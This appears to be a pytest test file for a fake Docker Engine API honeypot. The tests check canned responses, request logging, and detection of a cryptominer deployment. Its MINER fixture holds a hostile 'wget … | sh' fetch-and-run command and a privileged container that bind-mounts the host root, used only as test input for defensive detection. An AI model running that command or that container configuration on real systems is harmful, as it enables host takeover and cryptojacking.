"""Fake Docker Engine API decoy (port 2375): fixed replies, nothing executed, miner detected."""

from __future__ import annotations

import json
import os
import subprocess

import pytest
from fastapi.testclient import TestClient

from decoys.dockerapi.app import app
from qlure.correlate.engine import correlate
from qlure.events import Action, Service

IP = "198.51.100.231"
MINER = {
    "Image": "xmrig/xmrig:latest",
    "Cmd": ["sh", "-c", "wget http://203.0.113.9/x.sh -O- | sh; chmod +x /tmp/x"],
    "HostConfig": {"Privileged": True, "Binds": ["/:/host"]},
}


@pytest.fixture
def client(log_dir):
    c = TestClient(app, client=(IP, 40404))
    c.headers["user-agent"] = "Go-http-client/1.1"
    return c


@pytest.fixture
def nothing_runs(monkeypatch, tmp_path):
    def boom(*args, **kwargs):
        raise AssertionError("the decoy must never run anything")

    for name in ("Popen", "run", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, boom)
    monkeypatch.setattr(os, "system", boom)
    monkeypatch.setattr(os, "popen", boom)
    monkeypatch.chdir(tmp_path)
    return tmp_path


def test_ping(client):
    r = client.get("/_ping")
    assert (r.status_code, r.text) == (200, "OK")
    assert r.headers["api-version"] == "1.43"
    assert r.headers["server"].startswith("Docker/24.0.7")
    assert client.get("/v1.43/_ping").text == "OK"
    assert client.head("/_ping").status_code == 200


def test_version_and_info(client):
    version = client.get("/version").json()
    assert version["Version"] == "24.0.7" and version["Os"] == "linux"
    info = client.get("/v1.43/info").json()
    assert info["OperatingSystem"].startswith("Ubuntu 22.04")
    assert info["ServerVersion"] == "24.0.7"
    assert info["Name"] == "veltrix-app-01"  # the SSH decoy's hostname


def test_listings(client):
    containers = client.get("/v1.43/containers/json?all=1").json()
    assert [c["Image"] for c in containers] == ["nginx:1.24", "postgres:15", "veltrix/app:2.4.1"]
    assert all(len(c["Id"]) == 64 for c in containers)
    images = client.get("/images/json").json()
    assert {t for i in images for t in i["RepoTags"]} >= {"nginx:1.24", "postgres:15"}


def test_create_start_exec_pull_return_success_with_fake_ids(client, nothing_runs):
    created = client.post("/v1.43/containers/create?name=m", json=MINER)
    assert created.status_code == 201
    cid = created.json()["Id"]
    assert len(cid) == 64 and created.json()["Warnings"] == []
    assert client.post(f"/containers/{cid}/start").status_code == 204
    execd = client.post(f"/v1.43/containers/{cid}/exec", json={"Cmd": ["id"]})
    assert execd.status_code == 201 and len(execd.json()["Id"]) == 64
    assert client.post(f"/exec/{execd.json()['Id']}/start", json={}).status_code == 200
    pull = client.post("/images/create?fromImage=xmrig/xmrig&tag=latest")
    assert pull.status_code == 200 and "Pulling" in pull.text
    assert [f.name for f in nothing_runs.iterdir()] == ["docker.jsonl"]  # only the event log


def test_everything_else_is_the_docker_404(client):
    for method, path in [
        ("GET", "/"),
        ("GET", "/containers/abc/json"),
        ("DELETE", "/containers/abc"),
        ("POST", "/build"),
        ("GET", "/v1.43/swarm"),
        ("GET", "/containers/create"),
    ]:
        r = client.request(method, path)
        assert r.status_code == 404, (method, path)
        assert r.json() == {"message": "page not found"}


def test_requests_are_logged_with_a_capped_body_and_validate(client, read_events):
    big = {"Image": "alpine", "Cmd": ["x" * 5000]}
    client.get("/_ping")
    client.post("/v1.43/containers/create", json=big)
    events = read_events("docker")
    assert [e.action for e in events] == [Action.HTTP_REQUEST] * 2
    assert all(e.service is Service.DOCKER and e.src_ip == IP for e in events)
    post = events[1]
    assert post.request["method"] == "POST"
    assert post.request["path"] == "/v1.43/containers/create"
    assert len(post.request["body_preview"]) == 2048
    assert post.request["body_len"] > 5000
    assert post.response["status"] == 201


def test_oversized_body_is_refused(client, read_events):
    r = client.post("/containers/create", content=b"x" * (70 * 1024))
    assert r.status_code == 413
    assert read_events("docker")[0].response["status"] == 413


def test_miner_create_is_detected(client, read_events, nothing_runs):
    client.get("/_ping")
    client.get("/version")
    client.post("/v1.43/containers/create", content=json.dumps(MINER))
    result = correlate(read_events("docker"))
    finding = next(f for f in result.findings if f.session.service == "docker")
    assert {h.rule_id for h in finding.hits} == {"R5"}
    attack = set(finding.hits[0].attack)
    assert {"T1610", "T1611", "T1496", "T1105", "T1059.004"} <= attack
    assert finding.verdict in ("Suspicious", "Noteworthy")


def test_plain_create_of_a_benign_image_is_still_a_deploy(client, read_events):
    client.post("/containers/create", json={"Image": "alpine", "Cmd": ["sleep", "1"]})
    finding = correlate(read_events("docker")).findings[0]
    assert set(finding.hits[0].attack) == {"T1610"}
    assert finding.verdict == "Suspicious"


def test_read_only_browsing_is_not_flagged(client, read_events):
    for path in ("/_ping", "/version", "/info", "/containers/json", "/images/json"):
        client.get(path)
    finding = correlate(read_events("docker")).findings[0]
    assert finding.hits == [] and finding.verdict == "Benign"
